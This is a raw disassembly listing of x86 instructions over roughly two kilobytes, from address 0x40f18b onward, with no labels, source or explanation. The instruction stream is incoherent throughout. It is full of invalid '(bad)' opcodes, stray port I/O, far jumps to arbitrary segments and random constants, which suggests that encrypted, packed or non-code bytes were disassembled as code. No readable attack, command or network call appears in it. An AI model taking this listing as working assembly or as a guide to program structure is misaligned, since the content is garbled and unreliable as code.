  40f18b:	xlat   BYTE PTR ds:[ebx]
  40f18c:	push   edi
  40f18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f18e:	shl    DWORD PTR [eax+0x1b0dc573],1
  40f194:	jmp    0x99d6:0x4da0b013
  40f19b:	popf   
  40f19c:	rol    DWORD PTR [ecx],0x1
  40f19f:	jg     0x40f1ee
  40f1a1:	es stos BYTE PTR es:[edi],al
  40f1a3:	aam    0x78
  40f1a5:	in     al,dx
  40f1a6:	adc    DWORD PTR [ebp+0x405f1b1f],edi
  40f1ac:	mov    eax,0x160d2923
  40f1b1:	dec    ebx
  40f1b2:	add    ch,BYTE PTR [esi]
  40f1b4:	push   ds
  40f1b5:	sub    DWORD PTR [ecx],esi
  40f1b7:	test   bh,al
  40f1b9:	scas   eax,DWORD PTR es:[edi]
  40f1ba:	xchg   edi,eax
  40f1bb:	shl    DWORD PTR [ecx+ecx*8-0x5f],0x79
  40f1c0:	dec    ebp
  40f1c1:	(bad)  
  40f1c2:	mov    ecx,?
  40f1c4:	inc    edi
  40f1c5:	imul   edx,DWORD PTR [ecx],0xab887ef4
  40f1cb:	dec    ebp
  40f1cc:	mov    eax,ds:0xc26a9be9
  40f1d1:	das    
  40f1d2:	retf   0xe17a
  40f1d5:	das    
  40f1d6:	repz push ds
  40f1d8:	fidiv  DWORD PTR [edi]
  40f1da:	push   ebx
  40f1db:	and    DWORD PTR [ecx-0x4eecdbb4],ecx
  40f1e1:	jg     0x40f1ca
  40f1e3:	popa   
  40f1e4:	out    0x4f,al
  40f1e6:	shr    BYTE PTR [esi],1
  40f1e8:	cdq    
  40f1e9:	inc    ecx
  40f1ea:	push   esi
  40f1eb:	push   DWORD PTR [ebx+ebx*4-0x52]
  40f1ef:	out    dx,al
  40f1f0:	icebp  
  40f1f1:	(bad)  
  40f1f2:	push   esp
  40f1f3:	dec    ecx
  40f1f4:	into   
  40f1f5:	xchg   ebx,eax
  40f1f6:	cmp    esp,DWORD PTR [edi+0xe]
  40f1f9:	mov    eax,0x4fead978
  40f1fe:	sbb    bh,al
  40f200:	xchg   ax,ax
  40f202:	rcl    DWORD PTR [edx-0x206fa03b],cl
  40f208:	shl    DWORD PTR [ebx],1
  40f20a:	in     al,0xfb
  40f20c:	mov    BYTE PTR [ebx-0x5f],ah
  40f20f:	xor    eax,0xdb623400
  40f214:	dec    esi
  40f215:	dec    esi
  40f216:	or     eax,DWORD PTR [esi]
  40f218:	bound  ebp,QWORD PTR [esi-0x75e0aa50]
  40f21e:	sub    al,0x8
  40f220:	xchg   edi,eax
  40f221:	out    0xb9,al
  40f223:	pop    ebx
  40f224:	xor    DWORD PTR [esp+ebp*1+0x7c],ecx
  40f228:	enter  0x9165,0xc8
  40f22c:	lock pop ebp
  40f22e:	add    esi,DWORD PTR [edx+edx*8+0x2a4eb68c]
  40f235:	adc    al,0x52
  40f237:	popa   
  40f238:	pusha  
  40f239:	xchg   BYTE PTR [esi+0x3031fb44],dh
  40f23f:	inc    edx
  40f240:	mov    cs,esi
  40f242:	ins    DWORD PTR es:[edi],dx
  40f243:	repz cmc 
  40f245:	dec    edi
  40f246:	inc    esi
  40f247:	dec    ecx
  40f248:	pushf  
  40f249:	fcom   st(6)
  40f24b:	ins    DWORD PTR es:[edi],dx
  40f24c:	jmp    0xb4ee:0x208a0b
  40f253:	add    esi,DWORD PTR [esi+0x68]
  40f256:	cmp    eax,0xeaab91f0
  40f25b:	ja     0x40f2bf
  40f25d:	jns    0x40f233
  40f25f:	adc    eax,0x5b9e08fc
  40f264:	lds    esp,FWORD PTR cs:[ebx+0x43175f4c]
  40f26b:	add    ah,BYTE PTR [ebx+ebx*2-0x2d]
  40f26f:	mov    al,0x45
  40f271:	inc    esi
  40f272:	in     eax,0xd3
  40f274:	mov    cl,0x15
  40f276:	(bad)  
  40f277:	das    
  40f278:	adc    eax,0xcd68ce70
  40f27d:	fs pop ebx
  40f27f:	sub    eax,ecx
  40f281:	scas   eax,DWORD PTR es:[edi]
  40f282:	mov    ds:0xa5de581a,al
  40f287:	jmp    0x40f2a0
  40f289:	xchg   esp,eax
  40f28a:	and    al,0xab
  40f28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28d:	jecxz  0x40f30d
  40f28f:	push   ss
  40f290:	aas    
  40f291:	fist   DWORD PTR [edx-0x30]
  40f294:	and    eax,0x2b360fdf
  40f299:	push   esp
  40f29a:	das    
  40f29b:	pop    ds
  40f29c:	jg     0x40f291
  40f29e:	sub    eax,0x19d1b7b0
  40f2a3:	pop    esp
  40f2a4:	jae    0x40f254
  40f2a6:	nop
  40f2a7:	mov    DWORD PTR [edx+0x157a7eb0],0xf233e7bf
  40f2b1:	sub    dh,BYTE PTR [ecx+0x2ba0e898]
  40f2b7:	xlat   BYTE PTR ds:[ebx]
  40f2b8:	jl     0x40f2b7
  40f2ba:	adc    eax,0x13870319
  40f2bf:	rcr    BYTE PTR [edx+0x5bf67f20],cl
  40f2c5:	push   esi
  40f2c6:	js     0x40f25b
  40f2c8:	dec    ecx
  40f2c9:	or     BYTE PTR [ecx+0x1e913cd8],0xe8
  40f2d0:	push   es
  40f2d1:	and    BYTE PTR [ebx],cl
  40f2d3:	add    BYTE PTR [ecx+0x42038f9d],dl
  40f2d9:	pop    esi
  40f2da:	int    0x75
  40f2dc:	aas    
  40f2dd:	leave  
  40f2de:	xor    al,0xb3
  40f2e0:	das    
  40f2e1:	xor    BYTE PTR [esi-0x585b3398],ch
  40f2e7:	xchg   ebp,eax
  40f2e8:	inc    ebx
  40f2e9:	retf   
  40f2ea:	push   edx
  40f2eb:	scas   eax,DWORD PTR es:[edi]
  40f2ec:	dec    edx
  40f2ed:	or     cl,BYTE PTR [edx]
  40f2ef:	in     eax,dx
  40f2f0:	mov    ch,BYTE PTR [ebx]
  40f2f2:	mov    al,ds:0xacd606b3
  40f2f7:	jge    0x40f31a
  40f2f9:	test   DWORD PTR [eax],ebp
  40f2fb:	fbld   TBYTE PTR [ebx-0x718c9c95]
  40f301:	dec    ebp
  40f302:	add    BYTE PTR [edi],ah
  40f304:	mov    esp,0x6bed4a51
  40f309:	jmp    0x40d4:0xcd8744dd
  40f310:	outs   dx,BYTE PTR ds:[esi]
  40f311:	cli    
  40f312:	add    DWORD PTR ds:[ebx+edi*4-0x79],eax
  40f317:	mov    bh,0xd4
  40f319:	fld    DWORD PTR [esi-0x58]
  40f31c:	inc    edi
  40f31d:	mov    ch,0x8a
  40f31f:	add    DWORD PTR [ecx+ecx*1+0x5f9796b2],ecx
  40f326:	call   0xef80:0x34777439
  40f32d:	sar    ebx,0xd
  40f330:	cmp    DWORD PTR [esi],esi
  40f332:	push   esp
  40f333:	cdq    
  40f334:	fdiv   QWORD PTR [edx+edi*1+0xa]
  40f338:	mov    al,0x75
  40f33a:	cmp    esp,esp
  40f33c:	xchg   ebp,eax
  40f33d:	inc    ebp
  40f33e:	stos   BYTE PTR es:[edi],al
  40f33f:	pop    esi
  40f340:	xchg   edx,eax
  40f341:	mov    dl,0xaf
  40f343:	mov    DWORD PTR [ebx],esp
  40f345:	shr    DWORD PTR [ecx],cl
  40f347:	imul   esi,DWORD PTR [edi+eax*1],0xc04179a7
  40f34e:	jae    0x40f39b
  40f350:	pop    ebp
  40f351:	loop   0x40f31e
  40f353:	shr    DWORD PTR [ebp+0x9b613c1],0xf0
  40f35a:	cmp    eax,0x419150a0
  40f35f:	sub    eax,0xff3b030b
  40f364:	js     0x40f3ac
  40f366:	xlat   BYTE PTR ds:[ebx]
  40f367:	clc    
  40f368:	inc    edx
  40f369:	(bad)  
  40f36a:	(bad)  
  40f36b:	in     eax,0x57
  40f36d:	add    DWORD PTR [edi],ebp
  40f36f:	mov    dl,0xdb
  40f371:	jae    0x40f34a
  40f373:	pop    ecx
  40f374:	xchg   DWORD PTR ds:0x1ad346d5,esi
  40f37a:	mov    dh,0xcc
  40f37c:	stos   BYTE PTR es:[edi],al
  40f37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f37e:	push   ebp
  40f37f:	sbb    al,0x24
  40f381:	and    eax,0xd66ab7a0
  40f386:	into   
  40f387:	push   es
  40f388:	push   esp
  40f389:	jbe    0x40f3db
  40f38b:	bound  esi,QWORD PTR [edx]
  40f38d:	sbb    al,0x6f
  40f38f:	mov    ebp,0x19c3c178
  40f394:	into   
  40f395:	jmp    0x1496:0x9c3b983f
  40f39c:	loopne 0x40f3b0
  40f39e:	addr16 in eax,0x6
  40f3a1:	out    dx,al
  40f3a2:	sti    
  40f3a3:	test   eax,0x4c79dd90
  40f3a8:	push   ebp
  40f3a9:	outs   dx,BYTE PTR ds:[esi]
  40f3aa:	sbb    al,0xb
  40f3ac:	pop    edx
  40f3ad:	pop    ebx
  40f3ae:	mov    BYTE PTR [ecx-0x2a],ah
  40f3b1:	in     al,0x0
  40f3b3:	daa    
  40f3b4:	or     al,0x5e
  40f3b6:	mov    edi,0x66523157
  40f3bb:	cmp    eax,0xe4dd8648
  40f3c0:	jmp    0x23741f86
  40f3c5:	or     DWORD PTR [esi],0xfffffffb
  40f3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3c9:	call   FWORD PTR [eax+edx*2+0x13cae934]
  40f3d0:	imul   ebx,DWORD PTR [ecx-0x2527cc04],0x5e3315d6
  40f3da:	mov    al,ds:0xba8c6ea3
  40f3df:	stos   DWORD PTR es:[edi],eax
  40f3e0:	popa   
  40f3e1:	sahf   
  40f3e2:	stos   BYTE PTR es:[edi],al
  40f3e3:	cmp    eax,DWORD PTR [ebx+0x74]
  40f3e6:	es adc eax,0x88c93373
  40f3ec:	jmp    0x25b4:0x618ae91
  40f3f3:	cs jns 0x40f468
  40f3f6:	dec    eax
  40f3f7:	jb     0x40f3ba
  40f3f9:	mov    ds:0xb1ac17e6,eax
  40f3fe:	cmc    
  40f3ff:	mov    al,ds:0xc882d3d2
  40f404:	inc    ecx
  40f405:	scas   al,BYTE PTR es:[edi]
  40f406:	mov    bh,BYTE PTR [edx-0x1a]
  40f409:	fcomp  QWORD PTR [eax+edx*4]
  40f40c:	fmul   DWORD PTR [edx]
  40f40e:	fisttp WORD PTR [edx-0x696e2116]
  40f414:	loop   0x40f464
  40f416:	jns    0x40f3d0
  40f418:	into   
  40f419:	inc    ecx
  40f41a:	dec    ecx
  40f41b:	mov    edi,0x2e86cfd6
  40f420:	xchg   edx,eax
  40f421:	clc    
  40f422:	add    eax,0x38b09616
  40f427:	push   0x79
  40f429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f42a:	adc    esp,DWORD PTR [ebp-0x59]
  40f42d:	sbb    al,0xf6
  40f42f:	(bad)  
  40f431:	lds    edx,FWORD PTR [eax+eax*2+0x16cacdb3]
  40f438:	gs mov bh,0x87
  40f43b:	out    0xb7,eax
  40f43d:	(bad)  [esi]
  40f43f:	xchg   ebp,eax
  40f440:	mov    ebp,0x15c40825
  40f445:	cs retf 0xd64b
  40f449:	retf   0xe8f2
  40f44c:	pop    esi
  40f44d:	or     al,0x61
  40f44f:	dec    esi
  40f450:	add    eax,0x82c63407
  40f455:	mov    bh,0x6a
  40f457:	push   0x6213c9d1
  40f45c:	movntq QWORD PTR [edi+0x4ed2be24],mm6
  40f463:	inc    edi
  40f464:	xchg   ebp,eax
  40f465:	pop    ecx
  40f466:	sub    DWORD PTR [edi-0x22044fd7],ebp
  40f46c:	push   edx
  40f46d:	test   al,0x86
  40f46f:	xchg   ebx,eax
  40f470:	sub    DWORD PTR [eax+0x15b42031],edi
  40f476:	fisub  WORD PTR [edx-0x17]
  40f479:	jae    0x40f411
  40f47b:	cmp    DWORD PTR [edx-0x18],esi
  40f47e:	or     BYTE PTR [edi],ah
  40f480:	xlat   BYTE PTR ds:[ebx]
  40f481:	and    eax,0x8cf29e99
  40f486:	test   al,0x4e
  40f488:	aas    
  40f489:	xor    dh,BYTE PTR [edi+0x76]
  40f48c:	pop    esi
  40f48d:	fcom   DWORD PTR [edi+0x3355472e]
  40f493:	jle    0x40f458
  40f495:	sub    BYTE PTR [ebx-0x34],dh
  40f498:	cld    
  40f499:	data16 sti 
  40f49b:	fsubr  DWORD PTR [edx]
  40f49d:	jo     0x40f474
  40f49f:	mov    ebp,ecx
  40f4a1:	leave  
  40f4a2:	or     DWORD PTR [eax-0x14],0xffffffa2
  40f4a6:	mov    cs,WORD PTR [ecx+ecx*4-0x2e]
  40f4aa:	shr    ah,1
  40f4ac:	push   0x59
  40f4ae:	push   0xffffffee
  40f4b0:	scas   al,BYTE PTR es:[edi]
  40f4b1:	leave  
  40f4b2:	or     ebx,DWORD PTR [edi-0x2e]
  40f4b5:	xchg   edx,eax
  40f4b6:	out    dx,eax
  40f4b7:	test   DWORD PTR [eax+0x4c95f946],0xdd8ab80c
  40f4c1:	loop   0x40f4a4
  40f4c3:	add    ah,BYTE PTR [edx]
  40f4c5:	enter  0xbba9,0x82
  40f4c9:	xor    BYTE PTR [edi],bl
  40f4cb:	and    ebp,DWORD PTR ds:0xfe75956a
  40f4d1:	sti    
  40f4d2:	sub    ebx,DWORD PTR [eax+0x7e]
  40f4d5:	mov    ds:0x4ac11e8c,al
  40f4da:	fs sbb edx,esi
  40f4dd:	or     ch,BYTE PTR [ecx]
  40f4df:	in     eax,dx
  40f4e0:	pushf  
  40f4e1:	jae    0x40f550
  40f4e3:	fs mov edi,0x6dadf171
  40f4e9:	(bad)  
  40f4ea:	cmc    
  40f4eb:	cld    
  40f4ec:	cmp    ecx,edx
  40f4ee:	gs arpl ax,di
  40f4f1:	or     eax,0x7a391754
  40f4f6:	cwde   
  40f4f7:	push   0xbe724486
  40f4fc:	dec    ecx
  40f4fd:	push   edi
  40f4fe:	(bad)  
  40f4ff:	xchg   ecx,eax
  40f500:	pop    es
  40f501:	sub    BYTE PTR [edi*8-0x38c4e287],ch
  40f508:	loope  0x40f532
  40f50a:	test   al,0x9a
  40f50c:	ror    BYTE PTR [esi+0x65f236ff],1
  40f512:	pusha  
  40f513:	jecxz  0x40f4b8
  40f515:	not    DWORD PTR [ebp+0x7a4147ba]
  40f51b:	rol    DWORD PTR [eax-0x3c199f4e],0x5b
  40f522:	call   0x340e:0x7110032c
  40f529:	or     eax,0xbf882aa4
  40f52e:	out    0xc,eax
  40f530:	lods   al,BYTE PTR ds:[esi]
  40f531:	arpl   WORD PTR [ecx+0x3f2f4373],sp
  40f537:	sbb    BYTE PTR [edx+0x4a69412f],dl
  40f53d:	mov    dl,0xd8
  40f53f:	test   BYTE PTR [ecx],dh
  40f541:	xor    edi,DWORD PTR [esi+0x5d8f036c]
  40f547:	test   al,0xbc
  40f549:	mov    ebp,0xb79c312
  40f54e:	shl    cl,0xe0
  40f551:	(bad)  
  40f552:	(bad)  
  40f553:	mov    ds:0xa60d2ad4,eax
  40f558:	into   
  40f559:	aaa    
  40f55a:	push   ebp
  40f55b:	pop    ds
  40f55c:	inc    esi
  40f55d:	pusha  
  40f55e:	inc    eax
  40f55f:	fisub  WORD PTR [edx+0x52]
  40f562:	fcomp  DWORD PTR [edx+0x725e8caa]
  40f568:	xlat   BYTE PTR ds:[ebx]
  40f569:	dec    esi
  40f56a:	xchg   ebx,eax
  40f56b:	adc    esp,DWORD PTR [eax+0x24]
  40f56e:	inc    eax
  40f56f:	mov    ds:0x7857b8dd,al
  40f574:	and    DWORD PTR [ecx],ebp
  40f576:	sti    
  40f577:	inc    ebx
  40f578:	inc    esp
  40f579:	cdq    
  40f57a:	fcom   DWORD PTR [edi]
  40f57c:	stos   BYTE PTR es:[edi],al
  40f57d:	and    ebp,DWORD PTR [esi-0x38]
  40f580:	(bad)  
  40f581:	cmp    BYTE PTR [edx],ch
  40f583:	adc    BYTE PTR [eax+0x1f],bh
  40f586:	adc    BYTE PTR [esi+0x4e],0x3e
  40f58a:	xchg   edi,eax
  40f58b:	(bad)  
  40f58c:	ins    BYTE PTR es:[edi],dx
  40f58d:	ret    
  40f58e:	lods   eax,DWORD PTR ds:[esi]
  40f58f:	sbb    ch,dh
  40f591:	into   
  40f592:	stos   DWORD PTR es:[edi],eax
  40f593:	in     eax,dx
  40f594:	sub    eax,0xae37998b
  40f599:	rol    DWORD PTR [ebx-0xb],0xac
  40f59d:	enter  0x2f9c,0xe
  40f5a1:	sub    eax,0x27b0c75f
  40f5a6:	adc    bh,BYTE PTR [ebp-0x71]
  40f5a9:	mov    ah,0x13
  40f5ab:	push   cs
  40f5ac:	dec    eax
  40f5ad:	ss inc esi
  40f5af:	sbb    dh,BYTE PTR [ebp-0x57901b8c]
  40f5b5:	mov    ch,0x82
  40f5b7:	test   al,0x1b
  40f5b9:	mov    eax,0x75267858
  40f5be:	fxam   
  40f5c0:	jecxz  0x40f5d2
  40f5c2:	stos   BYTE PTR es:[edi],al
  40f5c3:	ja     0x40f5db
  40f5c5:	mov    WORD PTR [esp+edx*2-0x5e],?
  40f5c9:	out    0xe7,eax
  40f5cb:	add    ecx,DWORD PTR [esi+edx*8+0x5c]
  40f5cf:	push   ds
  40f5d0:	jecxz  0x40f56c
  40f5d2:	pop    ebp
  40f5d3:	add    BYTE PTR [ecx+0x5a],bh
  40f5d6:	test   bl,bh
  40f5d8:	pop    ecx
  40f5d9:	test   al,0x18
  40f5db:	pop    esp
  40f5dc:	push   esi
  40f5dd:	cmp    al,0xf
  40f5df:	(bad)  
  40f5e1:	shl    BYTE PTR [eax+0x12f08878],cl
  40f5e7:	stos   DWORD PTR es:[edi],eax
  40f5e8:	ss (bad) 
  40f5eb:	fnstcw WORD PTR [edx+0x4054acb0]
  40f5f1:	xchg   edx,eax
  40f5f2:	std    
  40f5f3:	fwait
  40f5f4:	icebp  
  40f5f5:	mov    ebx,0x6d175750
  40f5fa:	out    dx,eax
  40f5fb:	cmp    BYTE PTR [ebx-0x3e],bh
  40f5fe:	push   ebp
  40f5ff:	shl    DWORD PTR [edx-0x67],0x3c
  40f603:	sbb    al,0x6a
  40f605:	repz mov eax,DWORD PTR [ebx-0x63135b0e]
  40f60c:	cmp    BYTE PTR [eax+0x186ec90d],0x9f
  40f613:	inc    esi
  40f614:	add    bl,BYTE PTR [eax-0x377de84]
  40f61a:	mov    esi,0x4600f49b
  40f61f:	mov    cl,0xf8
  40f621:	inc    ebp
  40f622:	and    eax,0x6448ee8
  40f627:	jmp    0x40f636
  40f629:	dec    esp
  40f62a:	out    0xf7,eax
  40f62c:	gs (bad) 
  40f62e:	out    0x6,al
  40f630:	cdq    
  40f631:	daa    
  40f632:	pushf  
  40f633:	mov    eax,0x2f8b1658
  40f638:	xchg   esp,eax
  40f639:	ss mov esi,0x7b2f3515
  40f63f:	xchg   esi,eax
  40f640:	push   ebx
  40f641:	fucomp st(2)
  40f643:	not    ecx
  40f645:	pop    ebp
  40f646:	mov    bl,0xf2
  40f648:	div    BYTE PTR [edx-0xfd25d21]
  40f64e:	xor    bl,BYTE PTR [esi-0x3dd3a326]
  40f654:	sub    ebp,DWORD PTR [ecx+edi*2-0x1daf2b04]
  40f65b:	inc    esp
  40f65c:	retf   
  40f65d:	add    al,BYTE PTR [edi]
  40f65f:	xor    esi,DWORD PTR [ebx]
  40f661:	repnz stos BYTE PTR es:[edi],al
  40f663:	cmp    ecx,DWORD PTR [esi+esi*1]
  40f666:	inc    ebp
  40f667:	mov    bh,0x25
  40f669:	mov    dl,0xbc
  40f66b:	mov    ds:0x4ba33b08,eax
  40f670:	add    DWORD PTR [ebx-0xf3acf55],eax
  40f676:	jne    0x40f692
  40f678:	mov    ds:0xbd3fcc4,eax
  40f67d:	pop    edx
  40f67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f67f:	scas   al,BYTE PTR es:[edi]
  40f680:	dec    eax
  40f681:	inc    edi
  40f682:	nop
  40f683:	adc    al,0x82
  40f685:	xchg   edx,eax
  40f686:	leave  
  40f687:	inc    esp
  40f688:	jle    0x40f665
  40f68a:	sub    eax,0x3746e5f1
  40f68f:	mov    al,0xba
  40f691:	cmp    DWORD PTR [ecx-0x28],edx
  40f694:	int3   
  40f695:	mov    cl,0x8c
  40f697:	nop
  40f698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f699:	or     DWORD PTR [ebx-0x1e],ebp
  40f69c:	stos   DWORD PTR es:[edi],eax
  40f69d:	mov    edi,0x72b8c1f4
  40f6a2:	je     0x40f696
  40f6a4:	mov    edi,0xb5d2bae5
  40f6a9:	mov    ebp,0x87a23f76
  40f6ae:	fs mov eax,0x3a928e3f
  40f6b4:	push   DWORD PTR [esi]
  40f6b6:	jl     0x40f683
  40f6b8:	pop    esp
  40f6b9:	pushf  
  40f6ba:	lds    ecx,FWORD PTR [esi-0x253c7fea]
  40f6c0:	dec    ebx
  40f6c1:	(bad)  
  40f6c2:	(bad)  [esi+0x355eb077]
  40f6c8:	jmp    0xf7b20bae
  40f6cd:	cmp    ebx,esi
  40f6cf:	loopne 0x40f694
  40f6d1:	mov    ah,0xc4
  40f6d3:	push   0x11
  40f6d5:	sub    al,0x18
  40f6d7:	leave  
  40f6d8:	adc    al,cl
  40f6da:	jo     0x40f669
  40f6dc:	paddq  mm4,mm0
  40f6df:	cmp    eax,0x19d8669e
  40f6e4:	(bad)  
  40f6e5:	repz xor DWORD PTR [edx-0x6a6b7447],eax
  40f6ec:	enter  0x4465,0x78
  40f6f0:	or     al,0xd4
  40f6f2:	mov    esi,0xcbbca5bb
  40f6f7:	je     0x40f701
  40f6f9:	sbb    eax,0xb97cc6df
  40f6fe:	jl     0x40f70e
  40f700:	leave  
  40f701:	js     0x40f759
  40f703:	and    BYTE PTR [esi],0x36
  40f706:	in     al,dx
  40f707:	xchg   ecx,eax
  40f708:	outs   dx,DWORD PTR ds:[esi]
  40f709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70a:	mov    ds,WORD PTR [ebp+0x32e27b1a]
  40f710:	jle    0x40f740
  40f712:	mov    bh,0xe7
  40f714:	or     eax,0xe10a32a0
  40f719:	inc    ecx
  40f71a:	xchg   edi,eax
  40f71b:	xor    edi,DWORD PTR [ecx-0xd]
  40f71e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f71f:	or     cl,BYTE PTR [ecx+0x32]
  40f722:	adc    eax,esi
  40f724:	lock cmp edi,DWORD PTR [ecx-0x69124304]
  40f72b:	test   al,0xbc
  40f72d:	pop    es
  40f72e:	lods   eax,DWORD PTR ds:[esi]
  40f72f:	rcl    BYTE PTR [ecx-0x30],cl
  40f732:	cld    
  40f733:	in     al,dx
  40f734:	lods   eax,DWORD PTR ds:[esi]
  40f735:	and    eax,0x5fce9035
  40f73a:	aam    0x5a
  40f73c:	out    0x6f,eax
  40f73e:	outs   dx,DWORD PTR ds:[esi]
  40f73f:	add    esp,DWORD PTR [edx-0x48d5f033]
  40f745:	es xor eax,0x7fa5a75a
  40f74b:	loope  0x40f6f2
  40f74d:	adc    BYTE PTR [eax+0x29733930],bl
  40f753:	inc    edx
  40f754:	add    ecx,0xe36be2bf
  40f75a:	pop    es
  40f75b:	in     eax,0xeb
  40f75d:	int3   
  40f75e:	sub    eax,0xbe0dda14
  40f763:	pop    eax
  40f764:	dec    ebx
  40f765:	or     al,0x5d
  40f767:	mov    ebx,0x16ad58e7
  40f76c:	pop    esp
  40f76d:	sbb    eax,0xb8dce54c
  40f772:	sbb    eax,0xeb098d1f
  40f777:	push   esi
  40f778:	cmp    DWORD PTR [ebx-0x50],edi
  40f77b:	jle    0x40f70d
  40f77d:	mov    dh,0xf
  40f77f:	fcomp  DWORD PTR [edi]
  40f781:	and    BYTE PTR [ecx-0x4577a720],bh
  40f787:	je     0x40f779
  40f789:	jmp    0x6f8e:0x5192c3ee
  40f790:	add    ecx,DWORD PTR [ecx]
  40f792:	adc    al,0x28
  40f794:	in     al,dx
  40f795:	retf   
  40f796:	mov    ecx,0x1d5bfe68
  40f79b:	mul    BYTE PTR [esi-0x245a16b7]
  40f7a1:	nop
  40f7a2:	xor    ebx,esi
  40f7a4:	inc    ebp
  40f7a5:	mov    ch,ch
  40f7a7:	(bad)  
  40f7a8:	mov    ebp,0xcf80df11
  40f7ad:	(bad)
  40f7b0:	in     eax,0x88
  40f7b2:	or     DWORD PTR [ebx-0x46],0xffffffc2
  40f7b6:	inc    ecx
  40f7b7:	mov    eax,0xa1dbef05
  40f7bc:	or     al,BYTE PTR [eax+eiz*8-0x5c09be09]
  40f7c3:	or     DWORD PTR [esi+0x65ab94f8],ecx
  40f7c9:	(bad)  
  40f7ca:	test   BYTE PTR [edx+0x6a],dh
  40f7cd:	gs pop eax
  40f7cf:	fbstp  TBYTE PTR [ecx+esi*8+0x34]
  40f7d3:	and    dl,0x1
  40f7d6:	jmp    0x40f855
  40f7d8:	not    cl
  40f7da:	and    ch,BYTE PTR [eax]
  40f7dc:	mov    WORD PTR [ebp+esi*4+0x73],?
  40f7e0:	inc    edx
  40f7e1:	adc    dl,BYTE PTR [esi+eiz*2]
  40f7e4:	fdiv   DWORD PTR [ecx+0x2]
  40f7e7:	push   0xffffffea
  40f7e9:	es pop edx
  40f7eb:	aas    
  40f7ec:	sub    dl,BYTE PTR [ebp+0x1d430e78]
  40f7f2:	je     0x40f822
  40f7f4:	adc    DWORD PTR [esi],ebx
  40f7f6:	outs   dx,BYTE PTR ds:[esi]
  40f7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f8:	mov    cl,BYTE PTR [eax-0x7710c0cf]
  40f7fe:	arpl   WORD PTR [ebx+edx*2-0x12],di
  40f802:	mov    al,ds:0xabf75bdc
  40f807:	or     edi,DWORD PTR [edi+edi*4-0x1a]
  40f80b:	xchg   edx,eax
  40f80c:	xor    BYTE PTR [esi],dl
  40f80e:	pop    esi
  40f80f:	pop    edx
  40f810:	lods   eax,DWORD PTR ds:[esi]
  40f811:	loopne 0x40f7bb
  40f813:	lea    esi,[ecx+0x78]
  40f816:	ror    esi,1
  40f818:	stc    
  40f819:	adc    dh,al
  40f81b:	int    0xaa
  40f81d:	push   edi
  40f81e:	mov    bl,0x21
  40f820:	pop    ecx
  40f821:	sub    al,0xa
  40f823:	push   0x32
  40f825:	(bad)  [ebp-0x68]
  40f828:	mov    al,BYTE PTR [edx+eax*4-0x1f]
  40f82c:	mov    al,0x28
  40f82e:	xchg   esp,eax
  40f82f:	(bad)  
  40f830:	push   esi
  40f831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f832:	sar    DWORD PTR [bx],0x79
  40f836:	pop    es
  40f837:	sub    eax,ebx
  40f839:	clc    
  40f83a:	(bad)  
  40f83b:	jge    0x40f892
  40f83d:	cmp    cl,ah
  40f83f:	sbb    esp,0xa555c513
  40f845:	(bad)  
  40f846:	retf   0xee43
  40f849:	mov    esi,0x9c208f66
  40f84e:	mov    ebp,0x407c5bc2
  40f853:	cmp    ch,BYTE PTR [ecx+0x24679fcc]
  40f859:	popf   
  40f85a:	shl    ch,0x73
  40f85d:	ret    0xf1f9
  40f860:	imul   ebx,DWORD PTR [esi],0xffffff93
  40f863:	xor    bh,BYTE PTR [esi]
  40f865:	pop    ebp
  40f866:	shr    DWORD PTR [eax+ebx*8+0x703d704d],cl
  40f86d:	xchg   esi,eax
  40f86e:	mov    eax,0xbc5a14cd
  40f873:	jnp    0x40f8a6
  40f875:	in     al,0x9d
  40f877:	jl     0x40f833
  40f879:	jno    0x40f8ca
  40f87b:	mov    BYTE PTR [edi-0x2e],cl
  40f87e:	mov    DWORD PTR [ebp+0x8],esi
  40f881:	test   esi,edi
  40f883:	add    ch,dl
  40f885:	clc    
  40f886:	call   FWORD PTR [ebx-0x40]
  40f889:	add    bh,bl
  40f88b:	add    DWORD PTR [ecx+0x3a9b25ac],esp
  40f891:	cmp    BYTE PTR [ebp-0x2b836e43],dl
  40f897:	add    esi,esp
  40f899:	pop    ecx
  40f89a:	xchg   ecx,eax
  40f89b:	test   eax,0x61d5e7f8
  40f8a0:	cmp    DWORD PTR [esi],esi
  40f8a2:	jmp    0x40f87c
  40f8a4:	sub    ah,BYTE PTR [eax*4+0x43296619]
  40f8ab:	sbb    DWORD PTR [edi],edi
  40f8ad:	push   esi
  40f8ae:	popa   
  40f8af:	ins    DWORD PTR es:[edi],dx
  40f8b0:	sbb    al,0xb0
  40f8b2:	mov    ebx,0xdbfd545c
  40f8b7:	xor    al,0x4a
  40f8b9:	mov    al,0x2c
  40f8bb:	adc    al,0xe0
  40f8bd:	pop    edi
  40f8be:	ret    
  40f8bf:	shl    BYTE PTR [edi+0x295b2a8f],1
  40f8c5:	push   ecx
  40f8c6:	sahf   
  40f8c7:	inc    edx
  40f8c8:	data16 stos BYTE PTR es:[edi],al
  40f8ca:	jo     0x40f926
  40f8cc:	jbe    0x40f8ae
  40f8ce:	stos   BYTE PTR es:[edi],al
  40f8cf:	ss and al,0x33
  40f8d2:	xchg   edx,eax
  40f8d3:	ds icebp 
  40f8d5:	jg     0x40f872
  40f8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d8:	mov    esp,DWORD PTR [ebp+0x1fabfc70]
  40f8de:	mov    cs,WORD PTR [esi+ecx*2]
  40f8e1:	ret    
  40f8e2:	ficomp DWORD PTR ds:0xe273794f
  40f8e8:	jno    0x40f8c6
  40f8ea:	inc    ebx
  40f8eb:	data16 test al,0x2e
  40f8ee:	xlat   BYTE PTR ds:[ebx]
  40f8ef:	ins    DWORD PTR es:[edi],dx
  40f8f0:	mov    WORD PTR [eax],ss
  40f8f2:	mov    dh,0xec
  40f8f4:	out    0xde,al
  40f8f6:	ja     0x40f88e
  40f8f8:	fwait
  40f8f9:	js     0x40f91b
  40f8fb:	push   ebx
